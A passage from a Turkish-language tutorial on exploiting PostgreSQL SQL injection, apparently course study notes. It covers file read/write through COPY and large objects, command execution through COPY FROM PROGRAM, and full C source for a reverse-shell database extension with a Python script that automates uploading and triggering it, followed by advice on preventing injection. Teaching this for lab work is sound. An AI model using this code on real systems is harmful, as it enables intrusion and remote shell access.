Ne yazık ki bunu aşmanın mükemmel bir çözümü yok, ancak yapabileceğimiz şey, **`\t`** (tab) karakteri yerine verilerde bulunma ihtimali düşük olan başka bir karakteri ayraç (`delimiter`) olarak kullanmaktır. Örneğin şöyle yapabiliriz:

```shell-session
bluebird=# COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
COPY 7
bluebird=# SELECT * FROM tmp;
                             t                              
------------------------------------------------------------
 127.0.0.1       localhost
 127.0.1.1       kali
 
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
(7 rows)
```

#### Writing Files

`COPY` kullanarak dosya yazmak çok benzer şekilde çalışır - `COPY FROM` yerine bir tablodaki verileri bir dosyaya kopyalamak için `COPY TO` kullanacağız. Geride iz bırakmamak için geçici bir tablo kullanmak iyi bir fikirdir.

```shell-session
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE
bluebird=# INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
INSERT 0 1
bluebird=# COPY tmp TO '/tmp/proof.txt';
COPY 1
bluebird=# DROP TABLE tmp;
DROP TABLE
bluebird=# exit

[!bash!]$ cat /tmp/proof.txt 
To hack, or not to hack, that is the question
```

#### Permissions

Dosyaları read/write amacıyla `COPY` kullanmak için, kullanıcının ya sırasıyla [pg_read_server_files](https://www.postgresql.org/docs/11/default-roles.html) / [pg_write_server_files](https://www.postgresql.org/docs/11/default-roles.html) rolüne sahip olması ya da superuser olması gerekir.

Bir kullanıcının superuser olup olmadığını kontrol etmek oldukça basittir ve blind injection senaryolarında kolayca test edilebilir:

```shell-session
bluebird=# SELECT current_setting('is_superuser');
 current_setting 
-----------------
 on
(1 row)
```

Bir kullanıcının belirli bir role sahip olup olmadığını kontrol etmek o kadar basit değildir. Local olarak `\du` çalıştırabiliriz, ancak bir enjeksiyon yoluyla şöyle bir şeye ihtiyacımız olacaktır:

```shell-session
bluebird=# SELECT r.rolname, ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof FROM pg_catalog.pg_roles r WHERE r.rolname='fileuser';
 rolname  |        memberof        
----------+------------------------
 fileuser | {pg_read_server_files}
(1 row)
```

## Method 2: Large Objects

Dosyalarla uğraşmak için ikinci yöntem [large objects](https://www.postgresql.org/docs/current/largeobjects.html) kullanmaktır. Bu, COPY fonksiyonundan biraz daha zordur, ancak aynı zamanda çok güçlü bir özelliktir.

#### Reading Files

Bir dosyayı okumak için önce dosyayı yeni bir large objesine yüklemek üzere `lo_import` komutunu kullanmalıyız. Bu komut, daha sonra referans vermemiz gerekecek olan `large object`'in `object ID`'sini döndürmelidir.

```shell-session
bluebird=# SELECT lo_import('/etc/passwd');
 lo_import 
-----------
     16513
(1 row)
```

File import edildikten sonra bir `object ID` almalıyız. Dosya pg_largeobjects tablosunda hexstring olarak saklanacaktır. Dosyanın boyutu `2kb`'den büyükse, `large object` her biri `2kb` büyüklüğünde (hex kodlandığında 4096 karakter) `page`'lere bölünecektir. İçeriği `lo_get(<object id>)` ile alabiliriz:

```shell-session
bluebird=# SELECT lo_get(16513);
<SNIP>\x726f6f743a783a303a303a726f6f743a2...<SNIP>
```

Alternatif olarak, verileri doğrudan `pg_largeobject`'ten seçebilirsiniz, ancak bunun için page numaralarının da belirtilmesi gerekir:

```shell-session
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=1;
<SNIP>
```

Hexstring'i elde ettikten sonra, `xxd` kullanarak bunu şu şekilde geri dönüştürebiliriz:

```shell-session
[!bash!]$ echo 726f6f743<SNIP> | xxd -r -p
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nolog
<SNIP>
```

Ne yazık ki, large object oluştururken bir `object ID` belirtmek mümkün değildir, bu nedenle bunu körü körüne yapıyorsanız işleri zorlaştırır. Yapabileceğiniz bir şey, `pg_largeobject` tablosundan tüm `object ID`'lerini seçmek ve hangisinin size ait olduğunu bulmaktır:

```shell-session
bluebird=# SELECT DISTINCT loid FROM pg_largeobject;
 loid  
-------
 16515
(1 row)
```

#### Writing Files

`Large Object` kullanarak dosya yazmak çok benzer bir işlemdir. Esasen large bir object oluşturacağız, her seferinde `2kb` hex kodlu veri ekleyeceğiz ve ardından large object'i diskteki bir dosyaya aktaracağız.

Öncelikle yüklemek istediğimiz dosyayı `2kb`'lık parçalara bölerek hazırlamamız gerekiyor:

```shell-session
[!bash!]$ split -b 2048 /etc/passwd
[!bash!]$ ls -l
total 8
-rw-r--r-- 1 kali kali 2048 Feb 25 06:52 xaa
-rw-r--r-- 1 kali kali 1328 Feb 25 06:52 xab
```

Her bir chunk'ı (`xaa,xab,...`) aşağıdaki gibi hex-string'lere dönüştüreceğiz:

```shell-session
[!bash!]$ xxd -ps -c 99999999999 xaa
726f6f743a783a303a303a726<SNIP>
```

Bu hazır olduğunda, `lo_create` ile bilinen bir `object ID` ile `large object` oluşturabilir, ardından hex kodlu verileri `pg_largeobject`'e her seferinde bir page ekleyebilir, `lo_export` ile large object'i `object ID`'ye göre belirli bir path'e aktarabilir ve son olarak `lo_unlink` ile object'i veritabanından silebiliriz.

```shell-session
bluebird=# SELECT lo_create(31337);
 lo_create 
-----------
     31337
(1 row)

bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
INSERT 0 1
bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('6e2f626173<SNIP>96e0a','HEX'));
INSERT 0 1
bluebird=# SELECT lo_export(31337, '/tmp/passwd');
 lo_export 
-----------
         1
(1 row)

bluebird=# SELECT lo_unlink(31337);
 lo_unlink 
-----------
         1
(1 row)

bluebird=# exit

[!bash!]$ head /tmp/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

Kullanıcı izinlerine bağlı olarak, `INSERT` sorguları başarısız olabilir. Bu durumda, [dokümanlarda](https://www.postgresql.org/docs/current/lo-funcs.html) açıklandığı gibi `lo_put` kullanmayı deneyebilirsiniz:

```shell-session
bluebird=# SELECT lo_put(31337, 0, 'this is a test');
 lo_put 
--------
 
(1 row)
```

#### Permissions

Herhangi bir user large object oluşturabilir veya bağlantısını kaldırabilir, ancak değerlerin import edilmesi, export edilmesi veya güncellenmesi için kullanıcının ya superuser olması ya da açık izinlerin verilmiş olması gerekir. Bu konu hakkında daha fazla bilgiyi [buradan](https://www.postgresql.org/docs/current/lo-interfaces.html) edinebilirsiniz.


# Command Execution

## Introduction

Bu bölümde bir PostgreSQL enjeksiyonu aracılığıyla komutları çalıştırmanın iki yolunu inceleyeceğiz.

## Method 1: COPY

İlk yöntem bir kez daha built-in [COPY](https://www.postgresql.org/docs/current/sql-copy.html) komutunu kullanır. Görünüşe göre, dosyaları okuma ve yazmanın yanı sıra, `COPY` ayrıca bir `programdan` gelen verileri bir tabloda saklamamıza da izin veriyor. Bunun anlamı, `PostgreSQL`'in `postgres` kullanıcısı olarak shell komutlarını çalıştırmasını, sonuçları bir tabloda saklamasını ve bunları okumasını sağlayabileceğimizdir.

```shell-session
bluebird=# CREATE TABLE tmp(t TEXT);
CREATE TABLE
bluebird=# COPY tmp FROM PROGRAM 'id';
COPY 1
bluebird=# SELECT * FROM tmp;
                                   t                                    
------------------------------------------------------------------------
 uid=119(postgres) gid=124(postgres) groups=124(postgres),118(ssl-cert)
(1 row)

bluebird=# DROP TABLE tmp;
DROP TABLE
bluebird=# exit
```

İlginçtir ki, bu fonksiyona bir [CVE (CVE-2019-9193)](https://nvd.nist.gov/vuln/detail/CVE-2019-9193) atanmıştır, ancak PostgreSQL ekibi bunun amaçlanan bir fonksiyon olduğu ve bu nedenle bir güvenlik sorunu olmadığı yönünde bir [açıklama](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/) yayınlamıştır.

#### Permissions

Remote code execution için `COPY` kullanmak için, kullanıcının [pg_execute_server_program](https://www.postgresql.org/docs/11/default-roles.html) rolüne sahip olması veya superuser olması gerekir.

## Method 2: PostgreSQL Extensions

`PostgreSQL`'de komut çalıştırmanın biraz daha karmaşık ikinci bir yolu da bir `PostgreSQL` `Extension`'ı oluşturmaktır. [Extensions](https://www.postgresql.org/docs/current/external-extensions.html), özel fonksiyonlar eklemek için `PostgreSQL`'e yüklenebilen kütüphanelerdir.

Örnek olarak, `PostgreSQL` için `postgres` kullanıcısı olarak bir `reverse shell` döndüren aşağıdaki özel `C` extension'ını derleyip kullanacağız:

```c
// Reverse Shell as a Postgres Extension
// William Moody (@bmdyy)
// 08.02.2023

// CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '.../pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
// SELECT rev_shell('127.0.0.1', 443);
// DROP FUNCTION rev_shell;

// sudo apt install postgresql-server-dev-<version>
// gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>

#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"

PG_MODULE_MAGIC;

PG_FUNCTION_INFO_V1(rev_shell);

Datum
rev_shell(PG_FUNCTION_ARGS)
{
    // Get arguments
    char *LHOST = text_to_cstring(PG_GETARG_TEXT_PP(0));
    int32 LPORT = PG_GETARG_INT32(1);

    // Define necessary struct
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LPORT); // LPORT
    inet_pton(AF_INET, LHOST, &serv_addr.sin_addr); // LHOST

    // Connect to target
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    // Redirect STDOUT/IN/ERR to connection
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Start interactive /bin/sh
    execve("/bin/sh", NULL, NULL);

    PG_RETURN_INT32(0);
}
```

Not: Bu özel açık `Linux` üzerinde çalışan PostgreSQL'i hedeflemektedir. `Windows` için bir exploit yazma ve derleme işlemi çok benzerdir, sadece farklı API çağrıları ve bir DLL'ye derleme gerektirir.

Dosyanın başına yakın bir yerde `PG_MODULE_MAGIC` satırını görebilirsiniz. Uyumsuzluklardan kaynaklanan sorunları önlemek için `PostgreSQL` yalnızca doğru (major) versiyon için derlenmiş extensionları yüklemenize izin verecektir. Bu durumda, hedeflediğimiz `PostgreSQL` sürümü `13.9`'dur.

Bu extension'ı derlemek için öncelikle `13.` versiyon için `postgresql-server-dev` paketini yüklememiz gerekir:

```shell-session
[!bash!]$ sudo apt install postgresql-server-dev-13
```

Yüklendikten sonra, `gcc` kullanarak onu aşağıdaki gibi paylaşılan bir library objesine derleyebiliriz:

```shell-session
[!bash!]$ gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```

Bir sonraki adım `pg_rev_shell.so` dosyasını web sunucusuna yüklemektir. Bunu nasıl yaptığınız önemli değildir ( `COPY` ya da `Large Objects`), yeter ki yüklendiği yolu tam olarak bilin. Yüklendikten sonra, `rev_shell` fonksiyonunu kütüphaneden veritabanına yüklemek için `CREATE FUNCTION`'ı çalıştırabilir ve ardından bir reverse shell elde etmek için çağırabiliriz.

```shell-session
bluebird=# CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
CREATE FUNCTION
bluebird=# SELECT rev_shell('127.0.0.1', 443);
server closed the connection unexpectedly
        This probably means the server terminated abnormally
        before or while processing the request.
```

Not: Dosya `pg_rev_shell.so` olmasına rağmen, `PostgreSQL komutunda` extension bırakılır.

İkinci SQL komutunu çalıştırdığınızda, veritabanının fonksiyonun (reverse shell) bitmesini beklediği için askıda kalması beklenir. Listener'ınızı kontrol ederseniz, `postgres` olarak bir reverse shell almalısınız.

```shell-session
[!bash!]$ nc -nvlp 443
listening on [any] 443 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45692
whoami
postgres
exit
```

Komutları çalıştırmayı bitirdikten sonra, fonksiyonu ve oluşturmuş olabileceğiniz large object'leri (kütüphaneyi nasıl yüklediğinize bağlı olarak) veritabanından bırakarak arkanızı temizlediğinizden emin olun:

```shell-session
bluebird=# DROP FUNCTION rev_shell;
DROP FUNCTION
bluebird=# SELECT lo_unlink(58017);
 lo_unlink 
-----------
         1
(1 row)
```

Not: Tercih ederseniz, derleme için `gcc` ve `postgresql-server-dev-13`'ün zaten kurulu olduğu `test virtual makinesini` kullanabilirsiniz.

#### Permissions

PostgreSQL'de her kullanıcı fonksiyon oluşturamaz. Bunu yapmak için, bir kullanıcının ya `superuser` olması ya da genel schema üzerinde `CREATE` ayrıcalığına sahip olması gerekir. Ek olarak, `C` tüm ( super olmayan) kullanıcılar için varsayılan olarak güvenilmeyen bir dil olduğundan, `güvenilen` bir dil olarak eklenmiş olmalıdır.

Referans için [PSQL Belgelerine](https://www.postgresql.org/docs/current/sql-grant.html) ve [StackOverflow](https://stackoverflow.com/questions/7014437/error-permission-denied-for-language-c)'daki bu cevaba göz atın.

#### Automation / Writing an Exploit

Bazı durumlarda, adımları sizin için `otomatikleştirecek` bir exploit script yazmak mantıklı olabilir. Paylaşılan bir kütüphaneyi large objects aracılığıyla yüklemek ve ardından bir fonksiyon çağrısı yapmak birçok request gerektirebilir ve bunların hepsini manuel olarak göndermek oldukça sıkıcı olabilir, bu nedenle bu işi sizin yerinize yapacak bir script yazmak için iyi bir senaryodur.

İşte BlueBird'e karşı (kimliği doğrulanmamış) komut yürütmeyi otomatikleştiren neredeyse bitmiş bir script.

```python
#!/usr/bin/python3

import requests
import random
import string
from urllib.parse import quote_plus
import math

# Parameters for call to rev_shell
LHOST = "192.168.0.122"
LPORT = 443

# Generate a random string
def randomString(N):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

# Inject a query
def sqli(q):
    # TODO: Use an SQL injection to run the query `q`

# Read the compiled extension
with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000,60000)
sqli(f"SELECT lo_create({loid});")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object
for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{page.hex()}','hex'));")

# Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so');"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;"
query += f"SELECT rev_shell('{LHOST}', {LPORT});"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")
sqli(query)
```

# Preventing SQL Injection Vulnerabilities

## Input Validation / Sanitization

SQL injection, geliştiricilerin düzgün bir şekilde sterilize edilmemiş kullanıcı inputu kullanarak dinamik sorgular oluşturması nedeniyle meydana gelir. Siz (bir geliştirici olarak) her zaman kullanıcı inputunu sterilize etmeli ve belirli bir formla (örn. e-posta) eşleşmesi bekleniyorsa doğrulamalısınız. En iyi zihniyet, tüm kullanıcı inputlarını tehlikeliymiş gibi ele almaktır.

## Parameterized Queries

Parametrelendirilmiş sorgular kullanmak SQLi güvenlik açıklarından kaçınmak için çok iyi bir yoldur, çünkü sorguyu ve değişkenleri ayrı ayrı iletirsiniz ve sunucunun kullanıcı input'undan bağımsız olarak neyin kod neyin veri olduğunu anlamasını sağlarsınız.

İşte kullanıcı inputuna sorguda birleştiren savunmasız bir SQL sorgusu örneği.

```php
...
$sql = "SELECT email FROM accounts WHERE username = '" . $_POST['username'] . "'";
$stmt = sqlsrv_query($conn, $sql);
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);
...
sqlsrv_free_stmt($stmt);  
...
```

Aynı sorgu parametrelendirilmiş olsaydı bu şekilde görünürdü. Bu küçük bir değişikliktir, ancak savunmasız ve güvenli kod arasındaki farktır.

```php
$sql = "SELECT email FROM accounts WHERE username = ?";  
$stmt = sqlsrv_query($conn, $sql, array($_POST['username'])); 
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC); 
...
sqlsrv_free_stmt($stmt);  
```

Not: Tüm bunlardan sonra bile, db'de depolanan tüm kullanıcı verilerine tamamen güvenmemeliyiz, çünkü her zaman bir şeyleri gözden kaçırabiliriz ve kullanıcı db'de kötü amaçlı bir şey depolayabilir. Bu nedenle, özellikle kullanıcı tarafından oluşturulan verilerin çıktısı alınırken, veri çıktısı üzerinde sanitizasyon / filtreleme uygulanması da önerilir. Bu şekilde, veri girişi yerine veri çıktısı üzerinde çalışan 2. seviye SQL saldırılarını önlemiş oluruz.

## MSSQL-Specific Precautions

Özellikle MSSQL ile ilgili olarak, MSSQL'e özgü saldırıları önlemek için yapmak isteyebileceğiniz birkaç şey vardır.

#### Sorguları Sysadmin Olarak Çalıştırmayın!

İlk ve en önemlisi, sorgularınızı çalıştırmak için `sa` kullanmayın. Daha somut olarak, [mümkün olduğunca az ayrıcalığa sahip bir hesap kullanın](https://www.paloaltonetworks.com/cyberpedia/what-is-the-principle-of-least-privilege). Herhangi bir ekstra ayrıcalık, bir SQL enjeksiyonunu tanımlayan saldırganlar tarafından istismar edilebilir ve edilecektir.

Bu grafik ([kaynak](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver16)) MSSQL'deki built-in veritabanı rollerini vurgular. `Public` rolü varsayılan roldür ve diğer her şey ekstra rollerdir (`db_denydatareader` ve `db_denydatawriter` rolleri aslında ayrıcalıkları ortadan kaldırsa da).

![Pasted image 20250428231831.png](/img/user/resimler/Pasted%20image%2020250428231831.png)

#### Disable Dangerous Functions

İhtiyacı olmayan kullanıcılar için tehlikeli fonksiyonları devre dışı bırakmak isteyebilirsiniz. Örneğin, saldırganlar NetNTLM hash'lerini sızdırmak için `xp_dirtree`'yi kullanabilir ve web sitenizin bu fonksiyonu kullanmaması muhtemeldir, bu nedenle web sitenizin veritabanını sorgulamak için kullandığı belirli bir kullanıcı için `disable` bırakmak isteyebilirsiniz.

Örneğin, `public` rolüne sahip tüm kullanıcıların `xp_dirtree` üzerindeki `execution` privileges'lerini iptal etmek için şu komutu çalıştırırız:

```sql
REVOKE EXECUTE ON xp_dirtree TO public
```

Not: `xp_dirtree` gibi fonksiyonları tamamen devre dışı bırakmak mümkündür, ancak sunucunun kendisi bu fonksiyonu kullandığı için bu yapmak isteyeceğiniz bir şey değildir.
